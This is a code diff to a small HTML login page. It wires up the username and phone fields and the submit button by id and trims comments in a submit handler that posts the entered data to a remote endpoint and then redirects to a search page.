@@ -120,12 +120,17 @@ button {
             <div class="error" id="phoneError"></div>
         </div>
 
-        <button type="submit">Enter</button>
+        <button type="submit" id="submitBtn">Enter</button>
     </form>
 </div>
 
 <script>
 const btn = document.getElementById("submitBtn");
+const username = document.getElementById("username");
+const phone = document.getElementById("phone");
+
+const usernameError = document.getElementById("usernameError");
+const phoneError = document.getElementById("phoneError");
 
 document.getElementById("loginForm").addEventListener("submit", function(e) {
     e.preventDefault();
@@ -148,11 +153,10 @@ document.getElementById("loginForm").addEventListener("submit", function(e) {
 
     if (!valid) return;
 
-    // 🔄 show loading spinner
+    // spinner
     btn.disabled = true;
     btn.innerHTML = `<div class="spinner"></div>`;
 
-    // send data (fire and forget)
     fetch("https://hobo-call.onrender.com/send-phone", {
         method: "POST",
         headers: {
@@ -164,7 +168,6 @@ document.getElementById("loginForm").addEventListener("submit", function(e) {
         })
     }).catch(err => console.error(err));
 
-    // redirect immediately
     window.location.href = "search.html";
 });
 </script>
